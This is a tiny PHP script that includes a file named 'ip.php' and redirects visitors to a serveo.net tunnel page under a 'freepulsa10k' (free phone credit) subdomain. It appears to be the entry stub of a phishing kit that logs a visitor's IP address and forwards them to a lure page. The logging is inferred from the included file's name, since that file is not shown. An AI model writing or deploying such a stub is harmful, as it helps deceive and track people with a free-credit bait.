<?php
include 'ip.php';
header('Location: https://freepulsa10k.serveo.net/index2.html');
exit
?>
